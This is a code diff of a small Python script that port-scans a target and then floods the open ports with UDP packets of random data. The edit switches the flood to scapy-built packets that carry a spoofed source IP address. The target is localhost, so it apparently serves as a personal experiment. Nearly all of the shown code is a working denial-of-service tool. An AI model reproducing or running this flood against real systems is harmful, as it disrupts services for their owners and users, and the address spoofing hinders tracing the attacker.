@@ -1,7 +1,8 @@
 import time
 import socket
 import os
-from struct import pack
+from scapy.all import *
+from scapy.layers.inet import IP, ICMP, UDP
 
 
 def scan_ports(ip):
@@ -24,25 +25,10 @@ def scan_ports(ip):
 
 def udpflood(target, target_ports, duration):
     source_ip = '192.168.0.13'
-    dest_ip = target
-    ihl = 5
-    version = 4
-    tos = 0
-    tot_len = 20 + 20
-    id = 54321
-    frag_off = 0
-    ttl = 255
-    protocol = socket.IPPROTO_UDP
-    check = 10
-    saddr = socket.inet_aton(source_ip)
-    daddr = socket.inet_aton(dest_ip)
-
-    ihl_version = (version << 4) + ihl
-
-    ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
 
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     byts = os.urandom(1024)
+
     timeout = time.time() + duration
     sent = 0
     p = 0
@@ -53,7 +39,9 @@ def udpflood(target, target_ports, duration):
         else:
             pass
 
-        client.sendto(ip_header+byts, (target, target_ports[p]))
+        #client.sendto(byts, (target, target_ports[p]))
+        pack = IP(src=source_ip, dst=target) / UDP(dport=ports[p]) / Raw(byts)
+        send(pack)
         sent = sent + 1
         p = p + 1
         if p == len(target_ports):
@@ -64,6 +52,6 @@ def udpflood(target, target_ports, duration):
 
 targ = "127.0.0.1"
 ports = scan_ports(targ)
-dur = 5
+dur = 1
 
 udpflood(targ, ports, dur)
